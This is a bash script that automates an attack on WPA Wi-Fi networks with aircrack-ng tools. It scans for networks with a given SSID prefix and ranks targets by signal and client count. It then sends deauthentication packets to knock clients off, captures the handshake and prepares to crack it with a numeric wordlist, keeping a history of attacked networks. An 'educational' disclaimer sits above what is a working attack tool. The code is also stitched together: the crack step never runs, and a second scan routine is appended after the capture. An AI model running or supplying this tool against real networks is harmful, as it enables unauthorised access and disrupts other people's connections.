#!/usr/bin/env bash
#
# DISCLAIMER:
# This script is for educational demonstration only.
# Use only in a controlled lab environment with permission.
# Do NOT use on unauthorized networks.
#
# What this script does:
# 1. Enables monitor mode on a specified interface.
# 2. Scans for target networks with a known SSID pattern.
# 3. Focuses on one target network, capturing handshakes.
# 4. Sends deauth packets to force clients to reauthenticate.
# 5. Attempts to crack the handshake using a numeric-only wordlist.

# Debug function
debug() {
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo "[DEBUG] [$timestamp] $1" >> debug.log
    if [ "$VERBOSE" = true ]; then
        echo "[DEBUG] $1"
    fi
}

##############################################
# USER-ADJUSTABLE PARAMETERS
##############################################

IFACE="wlan1"              # Set to your wireless interface name before monitor mode
MON_IFACE="${IFACE}mon"    # This will be created by airmon-ng start <IFACE>
TARGET_SSID_PREFIX="WiFi-" # Adjust if your target networks have a different known prefix
WORDLIST="8digit.lst"      # Path to the numeric wordlist (must exist)
CAPTURE_DIR="./captures"   # Directory to store captures
ETH_IFACE="eth0"          # Ethernet interface name - adjust if different
HISTORY_FILE="attack_history.txt"  # File to store attack history
VERBOSE=${VERBOSE:-false}  # Set to true for verbose output
SCAN_TIME=${SCAN_TIME:-10} # Scan duration in seconds, default 10s

##############################################

# Check for root privileges
if [ "$(id -u)" != "0" ]; then
    echo "[!] This script must be run as root"
    exit 1
fi

# Create history file if it doesn't exist
touch "$HISTORY_FILE"

# Function to check if network was previously attacked
check_network_history() {
    local bssid=$1
    local last_attempt=$(grep "^$bssid," "$HISTORY_FILE" | tail -n 1)
    if [ ! -z "$last_attempt" ]; then
        echo "$last_attempt"
        return 0
    fi
    return 1
}

# Function to add network to history
add_to_history() {
    local bssid=$1
    local essid=$2
    local result=$3
    echo "$bssid,$essid,$(date '+%Y-%m-%d %H:%M:%S'),$result" >> "$HISTORY_FILE"
}

# Function to select target network
select_target_network() {
    local scan_file=$1
    declare -a networks=()
    local i=1
    
    debug "Reading scan results from $scan_file"
    if [ ! -f "$scan_file" ]; then
        debug "Scan file not found: $scan_file"
        return 1
    fi
    
    debug "Looking for networks matching prefix: $TARGET_SSID_PREFIX"
    echo
    echo "Available networks matching prefix '$TARGET_SSID_PREFIX':"
    echo "--------------------------------------------------------"
    echo "ID  ESSID                  Channel  Signal  Clients  Encryption"
    echo "--------------------------------------------------------"
    
    # First pass to collect unique networks
    # Note: Using _ prefix for fields we don't need to avoid invalid variable names
    while IFS=, read -r bssid first_time pwr beacons data iv channel key _ivsize _lan _ip _id _vendor essid; do
        # Skip header and empty lines
        if [[ "$bssid" =~ ^[[:space:]]*$ ]] || [[ "$bssid" == "BSSID" ]] || [[ "$bssid" =~ "Station MAC" ]]; then
            continue
        fi
        
        # Clean up ESSID (remove quotes and leading/trailing spaces)
        essid=$(echo "$essid" | tr -d '"' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
        debug "Found network: BSSID=$bssid ESSID=$essid Channel=$channel PWR=$pwr"
        
        # Only process lines with our target prefix and valid ESSID
        if [[ "$essid" == *"$TARGET_SSID_PREFIX"* ]] && [[ ! -z "$essid" ]]; then
            debug "Network matches target prefix: $essid"
            # Get client count
            client_count=$(grep -c "$bssid" "$scan_file" | grep -v "Station MAC")
            
            # Calculate score (higher is better)
            score=0
            if [[ "$pwr" =~ ^-?[0-9]+$ ]]; then
                score=$((score + (100 + pwr)))  # Convert signal strength to positive score
            fi
            
            if [[ "$client_count" =~ ^[0-9]+$ ]]; then
                score=$((score + client_count * 10))
            fi
            
            # Store network info
            networks+=("$bssid,$essid,$channel,$pwr,$client_count,$key,$score")
            
            # Display network info
            printf "%2d) %-20s %7s  %4sdB  %7s  %s\n" \
                  $i \
                  "${essid:0:20}" \
                  "$channel" \
                  "$pwr" \
                  "$client_count" \
                  "$key"
            ((i++))
        fi
    done < "$scan_file"
    
    if [ ${#networks[@]} -eq 0 ]; then
        debug "No networks found matching prefix '$TARGET_SSID_PREFIX'"
        echo "[!] No networks found matching prefix '$TARGET_SSID_PREFIX'"
        return 1
    fi
    
    debug "Found ${#networks[@]} matching networks"
    
    # Sort networks by score and show recommendation
    echo
    echo "Recommendation based on signal strength and client count:"
    best_network=$(printf '%s\n' "${networks[@]}" | sort -t',' -k7 -nr | head -n1)
    if [ ! -z "$best_network" ]; then
        IFS=',' read -r bssid essid channel pwr clients enc score <<< "$best_network"
        echo "→ $essid (Channel: $channel, Signal: ${pwr}dB, Clients: $clients)"
        echo "  Reason: Best combination of signal strength and client activity"
    fi
    
    # Get user selection
    echo
    while true; do
        read -p "Select network ID (1-$((i-1))) or 'q' to quit: " choice
        if [[ "$choice" == "q" ]]; then
            debug "User chose to quit"
            cleanup
        fi
        if [[ "$choice" =~ ^[0-9]+$ ]] && [ "$choice" -ge 1 ] && [ "$choice" -lt "$i" ]; then
            break
        fi
        echo "[!] Invalid selection. Please enter a number between 1 and $((i-1))"
    done
    
    # Return the selected network details
    debug "User selected network $choice"
    echo "${networks[$((choice-1))]}"
}

# Parse selected network details
parse_network_selection() {
    local network_info="$1"
    if [ -z "$network_info" ]; then
        echo "[!] No network information provided"
        return 1
    fi
    
    IFS=',' read -r BSSID ESSID CHANNEL PWR CLIENTS ENC SCORE <<< "$network_info"
    
    echo "[*] Selected target network:"
    echo "  ESSID: $ESSID"
    echo "  BSSID: $BSSID"
    echo "  Channel: $CHANNEL"
    echo "  Signal: ${PWR}dB"
    echo "  Encryption: $ENC"
    
    # Return values in global variables
    TARGET_ESSID="$ESSID"
    TARGET_BSSID="$BSSID"
    TARGET_CHANNEL="$CHANNEL"
}

# Safety checks for remote connection
check_ethernet() {
    # Check if ethernet interface exists and is connected
    if ! ip link show $ETH_IFACE &>/dev/null; then
        echo "[!] Ethernet interface $ETH_IFACE not found!"
        exit 1
    fi

    # Check if interface is up and has an IP
    if ! ip addr show $ETH_IFACE | grep -q "inet "; then
        echo "[!] No IP address on $ETH_IFACE. Ensure ethernet is connected!"
        exit 1
    fi

    # Check if default route is through ethernet
    if ! ip route | grep "default" | grep -q "$ETH_IFACE"; then
        echo "[!] Warning: Default route is not through ethernet!"
        read -p "Are you sure you want to continue? (y/N) " -n 1 -r
        echo
        if [[ ! $REPLY =~ ^[Yy]$ ]]; then
            exit 1
        fi
    fi
}

# Check SSH connection
check_ssh() {
    if [ -z "$SSH_CLIENT" ] && [ -z "$SSH_TTY" ]; then
        echo "[!] Not running over SSH - safety checks skipped"
        return 0
    fi

    # Get SSH connection details
    SSH_IP=$(echo "$SSH_CLIENT" | awk '{print $1}')
    
    echo "[*] SSH client IP: $SSH_IP"
    echo "[*] SSH connection route:"
    ip route get "$SSH_IP"
    
    # Check if SSH is running over wireless interface
    if ip route get "$SSH_IP" | grep -q "$IFACE"; then
        echo "[!] WARNING: SSH appears to be running over wireless interface ($IFACE)!"
        echo "[!] Continuing could disconnect your SSH session."
        read -p "Are you sure you want to continue? This is DANGEROUS! (y/N) " -n 1 -r
        echo
        if [[ ! $REPLY =~ ^[Yy]$ ]]; then
            exit 1
        fi
        echo "[!] Proceeding at your own risk..."
    else
        echo "[*] SSH appears to be running over a different interface than $IFACE (good!)"
    fi
}

# Perform safety checks
echo "[*] Performing safety checks..."
check_ethernet
check_ssh

# Ensure capture directory exists
mkdir -p "$CAPTURE_DIR"

# Redirect all output to a log file
exec > >(tee -i script.log)
exec 2>&1

# Check for required tools
for cmd in airmon-ng airodump-ng aireplay-ng aircrack-ng; do
    if ! command -v $cmd &>/dev/null; then
        echo "[!] Missing required tool: $cmd. Please install Aircrack-ng suite."
        exit 1
    fi
done

# Function to clean up (stop monitor mode) on exit
cleanup() {
    debug "Cleaning up: stopping monitor mode"
    echo "[*] Cleaning up: stopping monitor mode."
    sudo airmon-ng stop $MON_IFACE 2>/dev/null
    exit
}
trap cleanup INT TERM ERR

# Check for conflicting processes
echo "[*] Checking for conflicting processes..."
CONFLICTS=$(sudo airmon-ng check | grep "PID" -A 100 | grep -v "PID" | awk '{print $2}')
if [ ! -z "$CONFLICTS" ]; then
    echo "[!] Warning: Found conflicting processes that may prevent monitor mode from working properly."
    echo "    Conflicting processes: NetworkManager, wpa_supplicant, avahi-daemon"
    read -p "Would you like to kill these processes? (y/N) " -n 1 -r
    echo
    if [[ $REPLY =~ ^[Yy]$ ]]; then
        sudo airmon-ng check kill
    else
        echo "    Continuing without killing processes - monitor mode might fail"
    fi
fi

# Start monitor mode and get the monitor interface name
echo "[*] Enabling monitor mode..."
sudo airmon-ng start $IFACE || { echo "[!] Failed to start monitor mode"; exit 1; }

# Get the actual monitor interface name (might still be wlan1 or could be wlan1mon)
MON_IFACE=$(iwconfig 2>/dev/null | grep "Mode:Monitor" | awk '{print $1}')
if [ -z "$MON_IFACE" ]; then
    echo "[!] Could not find monitor interface"
    exit 1
fi
echo "[+] Monitor interface: $MON_IFACE"

# Update the IFACE variable to use the correct monitor interface
IFACE=$MON_IFACE

# Scan for target networks
echo "[*] Scanning for networks with ESSID prefix '$TARGET_SSID_PREFIX' (${SCAN_TIME}s scan)..."
debug "Starting airodump-ng scan"

# Run airodump-ng in background and redirect output
sudo airodump-ng $MON_IFACE --write scan --write-interval 1 --output-format csv > /dev/null 2>&1 &
SCAN_PID=$!

# Show a progress bar
for ((i=1; i<=$SCAN_TIME; i++)); do
    echo -n "."
    sleep 1
done
echo

# Kill the scan process
debug "Killing scan process $SCAN_PID"
kill $SCAN_PID 2>/dev/null
wait $SCAN_PID 2>/dev/null

# Check if scan file exists
if [ ! -f "scan-01.csv" ]; then
    debug "Scan file not created: scan-01.csv"
    echo "[!] Failed to create scan file"
    cleanup
fi

debug "Processing scan results"
# After scan completion, show menu and get selection
NETWORK_INFO=$(select_target_network "scan-01.csv")
if [ -z "$NETWORK_INFO" ]; then
    debug "No network selected or no networks found"
    echo "[!] No network selected"
    cleanup
fi

# Parse the selected network info
parse_network_selection "$NETWORK_INFO"
if [ -z "$TARGET_BSSID" ] || [ -z "$TARGET_CHANNEL" ]; then
    echo "[!] Failed to parse network information"
    cleanup
fi

echo "[*] Starting attack on $TARGET_ESSID"
debug "Starting handshake capture for BSSID: $TARGET_BSSID Channel: $TARGET_CHANNEL"

# Start capturing handshakes
CAP_FILE="$CAPTURE_DIR/${TARGET_ESSID}_capture"
echo "[*] Starting airodump-ng on the target network to capture handshake..."
sudo airodump-ng --bssid $TARGET_BSSID --channel $TARGET_CHANNEL --write $CAP_FILE \
    --write-interval 1 --output-format cap,csv $MON_IFACE > /dev/null 2>&1 &
AIRODUMP_PID=$!

sleep 2  # Give airodump time to start

# Send deauth packets
echo "[*] Sending deauth packets to force handshake capture..."
debug "Sending deauth packets to BSSID: $TARGET_BSSID"
if ! sudo aireplay-ng --deauth 20 -a $TARGET_BSSID $MON_IFACE 2>/dev/null; then
    debug "Failed to send deauth packets"
    echo "[!] Warning: Failed to send deauth packets. Capture may not contain a handshake."
fi

# Wait for handshake capture
echo "[*] Waiting for handshake capture (15 seconds)..."
for i in {1..15}; do
    echo -n "."
    sleep 1
done
echo

# Stop airodump-ng
debug "Stopping airodump-ng (PID: $AIRODUMP_PID)"
sudo kill $AIRODUMP_PID 2>/dev/null
wait $AIRODUMP_PID 2>/dev/null

# Validate handshake capture
if [ -f "${CAP_FILE}-01.cap" ]; then
    debug "Checking for handshake in ${CAP_FILE}-01.cap"
    if ! aircrack-ng "${CAP_FILE}-01.cap" 2>&1 | grep -q "handshake"; then
        debug "No handshake found in capture file"
        echo "[!] No WPA handshake detected in ${CAP_FILE}-01.cap"
        cleanup
    fi
    debug "Handshake found in capture file"
    echo "[+] Handshake captured successfully!"
else
    debug "Capture file not found: ${CAP_FILE}-01.cap"
    echo "[!] Capture file not found"
    cleanup
fi

# Attempt to crack the handshake
if [ ! -f "$WORDLIST" ]; then
    read -p "[!] Wordlist not found. Please provide the full path to a valid wordlist: " WORDLIST
    if [ ! -f "$WORDLIST" ]; then
        echo "[!] Invalid wordlist. Exiting."
        cleanup
    fi
fi

# Function to scan and list WiFi networks
scan_wifi_networks() {
    echo "[*] Scanning for WiFi networks..."
    # Scan for 10 seconds and grep for networks starting with WiFi
    sudo airodump-ng "$IFACE" --output-format csv -w /tmp/wifi_scan --write-interval 1 >/dev/null 2>&1 &
    sleep 10
    kill $!

    # Process the CSV file and filter networks starting with WiFi
    NETWORKS=($(cat /tmp/wifi_scan-01.csv | grep "WiFi" | awk -F ',' '{print $14}' | sed 's/^ //g' | sort -u))
    
    if [ ${#NETWORKS[@]} -eq 0 ]; then
        echo "[!] No networks found starting with 'WiFi'"
        exit 1
    fi

    # Display networks with numbers
    echo "[*] Available WiFi networks:"
    for i in "${!NETWORKS[@]}"; do
        echo "    $((i+1)). ${NETWORKS[$i]}"
    done

    # Get user selection
    while true; do
        read -p "[?] Select network number (1-${#NETWORKS[@]}): " selection
        if [[ "$selection" =~ ^[0-9]+$ ]] && [ "$selection" -ge 1 ] && [ "$selection" -le "${#NETWORKS[@]}" ]; then
            TARGET_NETWORK="${NETWORKS[$((selection-1))]}"
            TARGET_BSSID=$(cat /tmp/wifi_scan-01.csv | grep "$TARGET_NETWORK" | head -1 | awk -F ',' '{print $1}')
            TARGET_CHANNEL=$(cat /tmp/wifi_scan-01.csv | grep "$TARGET_NETWORK" | head -1 | awk -F ',' '{print $4}' | tr -d ' ')
            break
        else
            echo "[!] Invalid selection. Please try again."
        fi
    done

    # Cleanup temporary files
    rm -f /tmp/wifi_scan-01.csv

    echo "[+] Selected network: $TARGET_NETWORK"
    echo "[+] BSSID: $TARGET_BSSID"
    echo "[+] Channel: $TARGET_CHANNEL"
}

# Add this after setting up monitor mode
scan_wifi_networks